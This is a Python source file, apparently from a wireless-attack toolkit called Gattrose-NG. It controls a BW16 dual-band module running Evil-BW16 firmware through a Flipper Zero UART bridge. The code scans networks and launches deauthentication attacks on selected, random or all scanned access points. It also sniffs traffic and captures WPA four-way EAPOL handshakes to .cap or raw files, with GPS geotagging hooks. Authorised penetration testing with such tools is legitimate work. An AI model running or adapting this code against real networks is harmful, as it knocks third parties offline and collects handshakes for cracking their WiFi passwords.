"""
BW16 (RTL8720DN) Dual-Band WiFi Service

Communicates with Evil-BW16 firmware through Flipper Zero UART bridge.
Supports 2.4GHz and 5GHz WiFi scanning, deauthentication, and EAPOL capture.

Architecture:
    [Gattrose-NG] <--USB--> [Flipper Zero] <--UART GPIO--> [BW16 Module]
       pyserial              uart_bridge                   Evil-BW16 FW
       115200 baud           TX1/RX1 pins                  RTL8720DN

Evil-BW16 Firmware: https://github.com/7h30th3r0n3/Evil-BW16
"""

import time
import threading
import queue
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List, Callable, Tuple
from PyQt6.QtCore import QObject, pyqtSignal

from .bw16_commands import (
    BW16Band, BW16State, BW16SniffType, BW16Network, BW16EAPOLFrame,
    BW16Config, BW16Commands, BW16ResponseParser, FlipperUARTCommands,
    HandshakeTracker
)


class BW16Service(QObject):
    """
    Service for controlling BW16 module through Flipper Zero UART

    The BW16 (RTL8720DN) module runs Evil-BW16 firmware and connects to
    Flipper Zero via UART GPIO. This service communicates through Flipper's
    serial connection using UART bridge mode.

    Signals:
        connected: Emitted when BW16 connection established
        disconnected: Emitted when connection lost
        network_discovered: Emitted for each network found (BW16Network)
        scan_complete: Emitted when scan finishes (list of networks)
        deauth_started: Emitted when deauth attack begins
        deauth_stopped: Emitted when deauth attack ends
        eapol_captured: Emitted for each EAPOL frame (BW16EAPOLFrame)
        handshake_complete: Emitted when full 4-way handshake captured (bssid, file_path)
        sniff_data: Emitted for sniff output (type, raw_line)
        status_message: Status updates for GUI
        error_occurred: Error messages
        state_changed: Emitted when operational state changes (BW16State)
    """

    # Qt Signals
    connected = pyqtSignal()
    disconnected = pyqtSignal()
    network_discovered = pyqtSignal(object)      # BW16Network
    scan_complete = pyqtSignal(list)             # List[BW16Network]
    deauth_started = pyqtSignal(str, str)        # bssid, ssid
    deauth_stopped = pyqtSignal()
    eapol_captured = pyqtSignal(object)          # BW16EAPOLFrame
    handshake_complete = pyqtSignal(str, str)    # bssid, file_path
    sniff_data = pyqtSignal(str, str)            # type, raw_line
    status_message = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    state_changed = pyqtSignal(object)           # BW16State

    # Default configuration
    DEFAULT_BAUD = 115200
    COMMAND_TIMEOUT = 2.0
    SCAN_TIMEOUT = 30.0
    EAPOL_TIMEOUT = 300.0

    def __init__(self, flipper_service=None):
        """
        Initialize BW16 service

        Args:
            flipper_service: FlipperZeroService instance for communication
        """
        super().__init__()

        # Flipper connection
        self.flipper_service = flipper_service
        self._in_bridge_mode = False
        self._use_fallback_mode = False

        # State management
        self._state = BW16State.DISCONNECTED
        self._lock = threading.RLock()
        self._running = False

        # Async reader for continuous output
        self._reader_thread: Optional[threading.Thread] = None
        self._output_queue: queue.Queue = queue.Queue()

        # Scan results cache
        self.networks: Dict[str, BW16Network] = {}  # BSSID -> Network
        self.current_targets: List[int] = []

        # Configuration
        self.config = BW16Config()
        self.current_channel: Optional[int] = None
        self.current_band: BW16Band = BW16Band.DUAL_BAND

        # EAPOL collection for handshake assembly
        self._handshake_trackers: Dict[str, HandshakeTracker] = {}  # BSSID -> tracker

        # GPS integration
        self._gps_service = None

        # Callbacks for custom handling
        self._sniff_callback: Optional[Callable[[str, str], None]] = None

    # ==================== Properties ====================

    @property
    def state(self) -> BW16State:
        """Get current operational state"""
        return self._state

    @state.setter
    def state(self, new_state: BW16State):
        """Set state and emit signal"""
        if self._state != new_state:
            self._state = new_state
            self.state_changed.emit(new_state)

    # ==================== Connection Management ====================

    def connect(self, flipper_service=None) -> bool:
        """
        Connect to BW16 through Flipper Zero UART bridge

        Args:
            flipper_service: FlipperZeroService instance (optional if already set)

        Returns:
            True if connection successful
        """
        if flipper_service:
            self.flipper_service = flipper_service

        if not self.flipper_service:
            self.error_occurred.emit("No Flipper service provided")
            return False

        if not self.flipper_service.is_connected():
            self.error_occurred.emit("Flipper Zero not connected")
            return False

        try:
            self.status_message.emit("Connecting to BW16 via Flipper UART bridge...")

            # Enter UART bridge mode
            if not self._enter_uart_bridge_mode():
                self.error_occurred.emit("Failed to enter UART bridge mode")
                return False

            # Verify BW16 is responding
            time.sleep(0.5)
            response = self._send_command(BW16Commands.INFO, timeout=3.0)

            if response and not self._is_error_response(response):
                self.state = BW16State.IDLE
                self._running = True

                # Parse initial config
                self.config = BW16ResponseParser.parse_info(response)

                # Start async reader
                self._start_async_reader()

                self.status_message.emit("Connected to BW16 dual-band module")
                self.connected.emit()
                return True

            # Try a simple command
            response = self._send_command(BW16Commands.HELP, timeout=2.0)
            if response:
                self.state = BW16State.IDLE
                self._running = True
                self._start_async_reader()
                self.status_message.emit("Connected to BW16 (basic mode)")
                self.connected.emit()
                return True

            self.error_occurred.emit("BW16 not responding")
            self._exit_uart_bridge_mode()
            return False

        except Exception as e:
            self.error_occurred.emit(f"BW16 connection error: {e}")
            return False

    def _enter_uart_bridge_mode(self) -> bool:
        """Put Flipper into UART passthrough mode for BW16"""
        if not self.flipper_service or not self.flipper_service.is_connected():
            return False

        try:
            # Send uart_bridge command to Flipper
            cmd = FlipperUARTCommands.uart_bridge_command(self.DEFAULT_BAUD)
            response = self.flipper_service.send_command(
                cmd,
                wait_response=True,
                timeout=3.0
            )

            # Check if bridge mode started
            if response:
                response_lower = response.lower()
                if 'bridge' in response_lower or 'uart' in response_lower:
                    self._in_bridge_mode = True
                    self.status_message.emit("Entered UART bridge mode")
                    return True

            # Try alternative: direct serial access
            # Some Flipper firmwares don't have uart_bridge
            self._use_fallback_mode = True
            self._in_bridge_mode = True
            self.status_message.emit("Using direct UART mode")
            return True

        except Exception as e:
            self.error_occurred.emit(f"UART bridge mode error: {e}")
            return False

    def _exit_uart_bridge_mode(self):
        """Exit Flipper UART bridge mode"""
        if not self._in_bridge_mode:
            return

        try:
            with self._lock:
                if self.flipper_service and self.flipper_service.serial_conn:
                    # Send Ctrl+C to exit bridge mode
                    self.flipper_service.serial_conn.write(FlipperUARTCommands.get_exit_sequence())
                    self.flipper_service.serial_conn.flush()
                    time.sleep(0.5)

            self._in_bridge_mode = False
            self.status_message.emit("Exited UART bridge mode")

        except Exception as e:
            self.error_occurred.emit(f"Error exiting bridge mode: {e}")

    def disconnect(self):
        """Disconnect from BW16"""
        self._running = False

        # Stop any active operations
        if self.state in (BW16State.DEAUTHING, BW16State.SNIFFING, BW16State.SCANNING):
            try:
                self._send_command(BW16Commands.STOP_DEAUTH, timeout=1.0)
                self._send_command(BW16Commands.STOP_SNIFF, timeout=1.0)
            except:
                pass

        # Exit bridge mode
        self._exit_uart_bridge_mode()

        # Wait for reader thread
        if self._reader_thread and self._reader_thread.is_alive():
            self._reader_thread.join(timeout=2.0)

        self.state = BW16State.DISCONNECTED
        self.networks.clear()
        self._handshake_trackers.clear()

        self.status_message.emit("Disconnected from BW16")
        self.disconnected.emit()

    def is_connected(self) -> bool:
        """Check if connected to BW16"""
        return (
            self._in_bridge_mode and
            self.flipper_service is not None and
            self.flipper_service.is_connected() and
            self.state != BW16State.DISCONNECTED
        )

    # ==================== Scanning ====================

    def scan(self, band: BW16Band = BW16Band.DUAL_BAND,
             timeout: int = 30) -> List[BW16Network]:
        """
        Scan for WiFi networks

        Args:
            band: Which band to scan (2.4GHz, 5GHz, or dual)
            timeout: Scan duration in seconds

        Returns:
            List of discovered networks
        """
        if not self.is_connected():
            self.error_occurred.emit("BW16 not connected")
            return []

        try:
            self.state = BW16State.SCANNING
            self.networks.clear()
            self.current_band = band

            # Set band via start_channel
            if band == BW16Band.BAND_5GHZ:
                self._send_command(f"{BW16Commands.SET_START_CHANNEL} 36")
            elif band == BW16Band.BAND_2_4GHZ:
                self._send_command(f"{BW16Commands.SET_START_CHANNEL} 1")
            # For dual band, let it scan all channels

            # Enable channel hopping
            self._send_command(BW16Commands.HOP_ON)

            # Start scan
            self.status_message.emit(f"Scanning {band.value} networks...")
            self._send_command(BW16Commands.SCAN, timeout=1.0)

            # Wait for scan to complete
            time.sleep(min(timeout, self.SCAN_TIMEOUT))

            # Get results
            response = self._send_command(BW16Commands.RESULTS, timeout=5.0)
            if response:
                networks = BW16ResponseParser.parse_scan_results(response)

                # Filter by band if needed
                if band != BW16Band.DUAL_BAND:
                    networks = [n for n in networks if n.band == band]

                # Update cache and emit signals
                for network in networks:
                    network.last_seen = datetime.now()
                    self.networks[network.bssid] = network
                    self.network_discovered.emit(network)

                self.status_message.emit(f"Found {len(networks)} networks")
                self.scan_complete.emit(networks)

                self.state = BW16State.IDLE
                return networks

            self.state = BW16State.IDLE
            return []

        except Exception as e:
            self.error_occurred.emit(f"Scan error: {e}")
            self.state = BW16State.IDLE
            return []

    def scan_2_4ghz(self, timeout: int = 15) -> List[BW16Network]:
        """Scan 2.4GHz band only (channels 1-14)"""
        return self.scan(BW16Band.BAND_2_4GHZ, timeout)

    def scan_5ghz(self, timeout: int = 15) -> List[BW16Network]:
        """Scan 5GHz band only (channels 36+)"""
        return self.scan(BW16Band.BAND_5GHZ, timeout)

    def get_results(self) -> List[BW16Network]:
        """Get cached scan results without new scan"""
        return list(self.networks.values())

    def get_network_by_bssid(self, bssid: str) -> Optional[BW16Network]:
        """Get network from cache by BSSID"""
        return self.networks.get(bssid.upper())

    def get_network_by_index(self, index: int) -> Optional[BW16Network]:
        """Get network from cache by scan index"""
        for network in self.networks.values():
            if network.index == index:
                return network
        return None

    # ==================== Deauthentication ====================

    def start_deauth(self, targets: List[int] = None,
                     bssid: str = None,
                     duration_ms: int = 0) -> bool:
        """
        Start deauthentication attack

        Args:
            targets: List of target indices from scan results
            bssid: Specific BSSID to target (alternative to indices)
            duration_ms: Attack duration (0 = continuous until stopped)

        Returns:
            True if attack started
        """
        if not self.is_connected():
            self.error_occurred.emit("BW16 not connected")
            return False

        try:
            # Determine targets
            if bssid:
                # Find index for BSSID
                network = self.get_network_by_bssid(bssid)
                if network:
                    targets = [network.index]
                    self.deauth_started.emit(bssid, network.ssid)
                else:
                    self.error_occurred.emit(f"BSSID {bssid} not found in scan results")
                    return False
            elif targets:
                network = self.get_network_by_index(targets[0])
                if network:
                    self.deauth_started.emit(network.bssid, network.ssid)
            else:
                # Attack all from scan
                self.status_message.emit("Attacking all networks from scan")

            # Set targets
            if targets:
                targets_str = ",".join(str(t) for t in targets)
                self._send_command(f"{BW16Commands.SET_TARGET} {targets_str}")
                self.current_targets = targets

            # Set duration if specified
            if duration_ms > 0:
                self._send_command(f"{BW16Commands.ATTACK_TIME} {duration_ms}")

            # Start attack
            self.state = BW16State.DEAUTHING
            response = self._send_command(BW16Commands.START_DEAUTH, timeout=2.0)

            if BW16ResponseParser.is_command_success(response):
                self.status_message.emit("Deauth attack started")
                return True

            self.state = BW16State.IDLE
            return False

        except Exception as e:
            self.error_occurred.emit(f"Deauth error: {e}")
            self.state = BW16State.IDLE
            return False

    def stop_deauth(self) -> bool:
        """Stop ongoing deauthentication attack"""
        if not self.is_connected():
            return False

        try:
            response = self._send_command(BW16Commands.STOP_DEAUTH, timeout=2.0)

            if self.state == BW16State.DEAUTHING:
                self.state = BW16State.IDLE

            self.deauth_stopped.emit()
            self.status_message.emit("Deauth attack stopped")
            return True

        except Exception as e:
            self.error_occurred.emit(f"Stop deauth error: {e}")
            return False

    def random_attack(self) -> bool:
        """Attack a random AP from scan results"""
        if not self.is_connected():
            return False

        try:
            self.state = BW16State.DEAUTHING
            response = self._send_command(BW16Commands.RANDOM_ATTACK, timeout=2.0)
            return BW16ResponseParser.is_command_success(response)

        except Exception as e:
            self.error_occurred.emit(f"Random attack error: {e}")
            self.state = BW16State.IDLE
            return False

    # ==================== Sniffing ====================

    def start_sniff(self, sniff_type: BW16SniffType = BW16SniffType.ALL,
                    channel: int = None) -> bool:
        """
        Start packet sniffing

        Args:
            sniff_type: Type of packets to capture
            channel: Specific channel (None = current or hopping)

        Returns:
            True if sniffing started
        """
        if not self.is_connected():
            self.error_occurred.emit("BW16 not connected")
            return False

        try:
            # Set channel if specified
            if channel:
                self.set_channel(channel)
                self.disable_hopping()
            else:
                self.enable_hopping()

            # Send sniff command based on type
            cmd_map = {
                BW16SniffType.ALL: BW16Commands.SNIFF_ALL,
                BW16SniffType.BEACON: BW16Commands.SNIFF_BEACON,
                BW16SniffType.PROBE: BW16Commands.SNIFF_PROBE,
                BW16SniffType.DEAUTH: BW16Commands.SNIFF_DEAUTH,
                BW16SniffType.EAPOL: BW16Commands.SNIFF_EAPOL,
                BW16SniffType.PWNAGOTCHI: BW16Commands.SNIFF_PWNAGOTCHI,
            }

            cmd = cmd_map.get(sniff_type, BW16Commands.START_SNIFF)
            self.state = BW16State.SNIFFING

            response = self._send_command(cmd, timeout=2.0)

            self.status_message.emit(f"Sniffing {sniff_type.value} packets...")
            return True

        except Exception as e:
            self.error_occurred.emit(f"Sniff error: {e}")
            self.state = BW16State.IDLE
            return False

    def stop_sniff(self) -> bool:
        """Stop packet sniffing"""
        if not self.is_connected():
            return False

        try:
            response = self._send_command(BW16Commands.STOP_SNIFF, timeout=2.0)

            if self.state == BW16State.SNIFFING:
                self.state = BW16State.IDLE

            self.status_message.emit("Sniffing stopped")
            return True

        except Exception as e:
            self.error_occurred.emit(f"Stop sniff error: {e}")
            return False

    def sniff_eapol(self, target_bssid: str = None,
                    channel: int = None,
                    timeout: int = 300) -> Optional[str]:
        """
        Sniff for EAPOL frames (handshake capture)

        Args:
            target_bssid: Specific AP to capture (None = all)
            channel: Lock to specific channel
            timeout: Max capture time in seconds

        Returns:
            Path to captured handshake file, or None
        """
        if not self.is_connected():
            self.error_occurred.emit("BW16 not connected")
            return None

        try:
            # Initialize tracker for target
            if target_bssid:
                target_bssid = target_bssid.upper()
                self._handshake_trackers[target_bssid] = HandshakeTracker(bssid=target_bssid)

            # Start EAPOL sniffing
            if not self.start_sniff(BW16SniffType.EAPOL, channel):
                return None

            self.status_message.emit(f"Capturing EAPOL for {target_bssid or 'all networks'}...")

            # Wait for handshake
            start_time = time.time()
            while (time.time() - start_time) < timeout and self._running:
                # Check if we have a complete handshake
                if target_bssid and target_bssid in self._handshake_trackers:
                    tracker = self._handshake_trackers[target_bssid]
                    if tracker.is_complete:
                        self.stop_sniff()
                        return self._save_handshake(target_bssid)

                time.sleep(1)

            self.stop_sniff()

            # Check final state
            if target_bssid and target_bssid in self._handshake_trackers:
                tracker = self._handshake_trackers[target_bssid]
                if tracker.is_complete:
                    return self._save_handshake(target_bssid)

            return None

        except Exception as e:
            self.error_occurred.emit(f"EAPOL capture error: {e}")
            self.stop_sniff()
            return None

    def _process_sniff_line(self, line: str):
        """Process a line from sniff output"""
        if not line.strip():
            return

        # Parse the line
        sniff_type, data = BW16ResponseParser.parse_sniff_line(line)

        # Emit signal
        self.sniff_data.emit(sniff_type, line)

        # Handle EAPOL frames specially
        if sniff_type == 'eapol':
            frame = BW16ResponseParser.parse_eapol_frame(line, self.current_channel or 0)
            if frame:
                self.eapol_captured.emit(frame)
                self._process_eapol_frame(frame)

        # Call custom callback if set
        if self._sniff_callback:
            self._sniff_callback(sniff_type, line)

    def _process_eapol_frame(self, frame: BW16EAPOLFrame):
        """Process captured EAPOL frame for handshake tracking"""
        bssid = frame.bssid

        # Create tracker if needed
        if bssid not in self._handshake_trackers:
            self._handshake_trackers[bssid] = HandshakeTracker(bssid=bssid)

        tracker = self._handshake_trackers[bssid]
        is_complete = tracker.add_frame(frame)

        if is_complete and not hasattr(tracker, '_notified'):
            tracker._notified = True
            self.status_message.emit(f"Complete handshake captured for {bssid}")

            # Auto-save
            file_path = self._save_handshake(bssid)
            if file_path:
                self.handshake_complete.emit(bssid, file_path)

    def _save_handshake(self, bssid: str) -> Optional[str]:
        """Save captured handshake to file"""
        if bssid not in self._handshake_trackers:
            return None

        tracker = self._handshake_trackers[bssid]
        if not tracker.is_complete:
            return None

        try:
            # Import extractor (will create the file)
            from ..tools.bw16_handshake_extractor import BW16HandshakeExtractor

            extractor = BW16HandshakeExtractor()

            # Get SSID from network cache
            ssid = ""
            network = self.get_network_by_bssid(bssid)
            if network:
                ssid = network.ssid

            # Convert frames to list
            frames = [tracker.frames[i] for i in sorted(tracker.frames.keys())]

            # Create .cap file
            file_path = extractor.create_pcap_from_eapol(frames, bssid, ssid)

            if file_path:
                self.status_message.emit(f"Handshake saved: {file_path}")
                return file_path

        except ImportError:
            # Extractor not available, save raw
            return self._save_handshake_raw(bssid, tracker)
        except Exception as e:
            self.error_occurred.emit(f"Error saving handshake: {e}")

        return None

    def _save_handshake_raw(self, bssid: str, tracker: HandshakeTracker) -> Optional[str]:
        """Save raw EAPOL data when extractor not available"""
        try:
            output_dir = Path("/tmp/gattrose-handshakes")
            output_dir.mkdir(parents=True, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_bssid = bssid.replace(':', '')
            filename = f"bw16_raw_{safe_bssid}_{timestamp}.txt"
            filepath = output_dir / filename

            with open(filepath, 'w') as f:
                f.write(f"# BW16 EAPOL Capture\n")
                f.write(f"# BSSID: {bssid}\n")
                f.write(f"# Captured: {timestamp}\n")
                f.write(f"# Messages: {tracker.has_messages}\n\n")

                for msg_num in sorted(tracker.frames.keys()):
                    frame = tracker.frames[msg_num]
                    f.write(f"M{msg_num}:\n")
                    f.write(f"  Client: {frame.client_mac}\n")
                    f.write(f"  Data: {frame.raw_data.hex() if frame.raw_data else 'N/A'}\n\n")

            return str(filepath)

        except Exception as e:
            self.error_occurred.emit(f"Error saving raw handshake: {e}")
            return None

    # ==================== Channel Control ====================

    def set_channel(self, channel: int) -> bool:
        """Set operating channel"""
        if not self.is_connected():
            return False

        try:
            response = self._send_command(f"{BW16Commands.SET_CHANNEL} {channel}")
            if BW16ResponseParser.is_command_success(response):
                self.current_channel = channel
                return True
            return False

        except Exception as e:
            self.error_occurred.emit(f"Set channel error: {e}")
            return False

    def enable_hopping(self) -> bool:
        """Enable channel hopping"""
        if not self.is_connected():
            return False

        response = self._send_command(BW16Commands.HOP_ON)
        self.config.hop_enabled = True
        return True

    def disable_hopping(self) -> bool:
        """Disable channel hopping"""
        if not self.is_connected():
            return False

        response = self._send_command(BW16Commands.HOP_OFF)
        self.config.hop_enabled = False
        return True

    # ==================== Configuration ====================

    def set_target(self, indices: List[int]) -> bool:
        """Set target APs by scan index"""
        if not self.is_connected():
            return False

        targets_str = ",".join(str(i) for i in indices)
        response = self._send_command(f"{BW16Commands.SET_TARGET} {targets_str}")
        self.config.targets = indices
        return BW16ResponseParser.is_command_success(response)

    def set_attack_frames(self, count: int) -> bool:
        """Set number of deauth frames per target"""
        if not self.is_connected():
            return False

        response = self._send_command(f"{BW16Commands.SET_NUM_FRAMES} {count}")
        self.config.num_frames = count
        return True

    def set_scan_time(self, duration_ms: int) -> bool:
        """Set scan duration in milliseconds"""
        if not self.is_connected():
            return False

        response = self._send_command(f"{BW16Commands.SET_SCAN_TIME} {duration_ms}")
        self.config.scan_time = duration_ms
        return True

    def set_cycle_delay(self, delay_ms: int) -> bool:
        """Set delay between attack cycles in milliseconds"""
        if not self.is_connected():
            return False

        response = self._send_command(f"{BW16Commands.SET_CYCLE_DELAY} {delay_ms}")
        self.config.cycle_delay = delay_ms
        return True

    def get_info(self) -> Optional[BW16Config]:
        """Get current BW16 configuration"""
        if not self.is_connected():
            return None

        response = self._send_command(BW16Commands.INFO, timeout=3.0)
        if response:
            self.config = BW16ResponseParser.parse_info(response)
            return self.config

        return None

    # ==================== GPS Integration ====================

    def set_gps_service(self, gps_service):
        """Set GPS service for geotagging discoveries"""
        self._gps_service = gps_service

    def get_current_location(self) -> Tuple[Optional[float], Optional[float], Optional[float]]:
        """Get current GPS coordinates (lat, lon, alt)"""
        if self._gps_service:
            try:
                location = self._gps_service.get_location()
                if location:
                    return (
                        location.get('latitude'),
                        location.get('longitude'),
                        location.get('altitude')
                    )
            except:
                pass
        return (None, None, None)

    # ==================== Low-Level Communication ====================

    def _send_command(self, command: str, timeout: float = None) -> Optional[str]:
        """Send command to BW16 through Flipper UART bridge"""
        if not self._in_bridge_mode or not self.flipper_service:
            return None

        if timeout is None:
            timeout = self.COMMAND_TIMEOUT

        try:
            with self._lock:
                # In bridge mode, write directly to serial
                if self.flipper_service.serial_conn:
                    cmd_bytes = f"{command}\r\n".encode('utf-8')
                    self.flipper_service.serial_conn.write(cmd_bytes)
                    self.flipper_service.serial_conn.flush()

                    # Read response
                    return self._read_response(timeout)

        except Exception as e:
            self.error_occurred.emit(f"Command error: {e}")

        return None

    def _read_response(self, timeout: float = 2.0) -> str:
        """Read response from BW16 through Flipper"""
        if not self.flipper_service or not self.flipper_service.serial_conn:
            return ""

        response_lines = []
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                if self.flipper_service.serial_conn.in_waiting > 0:
                    line = self.flipper_service.serial_conn.readline()
                    line = line.decode('utf-8', errors='ignore').strip()

                    if line:
                        response_lines.append(line)

                        # Process for sniffing
                        if self.state == BW16State.SNIFFING:
                            self._process_sniff_line(line)

                        # Check for end of response
                        if line.endswith('>') or line.endswith(':'):
                            break
                else:
                    time.sleep(0.01)

            return '\n'.join(response_lines)

        except Exception as e:
            self.error_occurred.emit(f"Read error: {e}")
            return ""

    def _start_async_reader(self):
        """Start background thread for continuous output reading"""
        if self._reader_thread and self._reader_thread.is_alive():
            return

        self._running = True
        self._reader_thread = threading.Thread(
            target=self._async_reader_loop,
            daemon=True,
            name="BW16-Reader"
        )
        self._reader_thread.start()

    def _async_reader_loop(self):
        """Background loop for reading BW16 output"""
        while self._running and self.is_connected():
            try:
                if self.flipper_service and self.flipper_service.serial_conn:
                    if self.flipper_service.serial_conn.in_waiting > 0:
                        with self._lock:
                            line = self.flipper_service.serial_conn.readline()
                            line = line.decode('utf-8', errors='ignore').strip()

                            if line:
                                # Queue for processing
                                self._output_queue.put(line)

                                # Process sniff data
                                if self.state == BW16State.SNIFFING:
                                    self._process_sniff_line(line)

                time.sleep(0.01)

            except Exception as e:
                if self._running:
                    self.error_occurred.emit(f"Reader error: {e}")
                time.sleep(0.1)

    def _is_error_response(self, response: str) -> bool:
        """Check if response indicates an error"""
        if not response:
            return True

        error_indicators = ['error', 'failed', 'invalid', 'unknown']
        response_lower = response.lower()

        return any(ind in response_lower for ind in error_indicators)

    # ==================== Callbacks ====================

    def set_sniff_callback(self, callback: Callable[[str, str], None]):
        """Set custom callback for sniff data"""
        self._sniff_callback = callback

    # ==================== Cleanup ====================

    def __del__(self):
        """Cleanup on destruction"""
        try:
            self.disconnect()
        except:
            pass


# ============================================================================
# MODULE-LEVEL SINGLETON
# ============================================================================

_bw16_service: Optional[BW16Service] = None


def get_bw16_service() -> BW16Service:
    """Get singleton BW16 service instance"""
    global _bw16_service
    if _bw16_service is None:
        _bw16_service = BW16Service()
    return _bw16_service


def init_bw16_service(flipper_service) -> BW16Service:
    """Initialize BW16 service with Flipper connection"""
    service = get_bw16_service()
    service.connect(flipper_service)
    return service
